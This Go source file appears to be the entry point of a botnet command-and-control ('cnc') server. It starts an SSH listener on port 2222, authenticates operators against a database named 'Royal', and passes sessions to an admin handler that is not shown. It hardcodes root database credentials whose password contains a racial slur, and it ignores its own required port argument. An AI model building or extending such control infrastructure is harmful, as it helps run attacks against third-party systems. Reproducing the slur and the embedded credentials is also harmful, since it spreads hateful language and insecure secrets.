package main

import (
	"fmt"
	"github.com/gliderlabs/ssh"
	"github.com/matthewhartstonge/argon2"
	gossh "golang.org/x/crypto/ssh"
	"io/ioutil"
	"log"
	"os"
)

var database *Database = NewDatabase("127.0.0.1", "root", "nigga123", "Royal")
var argon argon2.Config

func main() {
	if len(os.Args) != 2 {
		log.Println("./cnc <cnc port>")
		return
	}
	argon = argon2.DefaultConfig()
	sshConfig := &ssh.Server{
		Addr:            ":2222",
		Handler:         sessionHandler,
		PasswordHandler: passwordHandler,
	}
	keyParser("ssh/ssh", sshConfig)
	err := sshConfig.ListenAndServe()
	if err != nil {
		log.Fatal(err)
	}
}

func sessionHandler(session ssh.Session) {
	NewAdmin(session).Handle()
}

func passwordHandler(ctx ssh.Context, password string) bool {
	login, err := database.TryLogin(ctx.User(), password)
	if err != nil {
		log.Println(err)
		return false
	}
	return login
}

func parseAuthorizationKey(file string) (ssh.PublicKey, error) {
	pubKeyBuffer, err := os.ReadFile(file)
	if err != nil {
		return nil, err
	}
	pubKey, _, _, _, err := ssh.ParseAuthorizedKey(pubKeyBuffer)
	if err != nil {
		return nil, err
	}
	return pubKey, nil
}

func keyParser(file string, srv *ssh.Server) {
	pemBytes, err := ioutil.ReadFile(file)
	if err != nil {
		fmt.Println(err)
		return
	}
	hostKey, err := gossh.ParsePrivateKey(pemBytes)
	if err != nil {
		fmt.Println(err)
		return
	}
	srv.AddHostKey(hostKey)
}
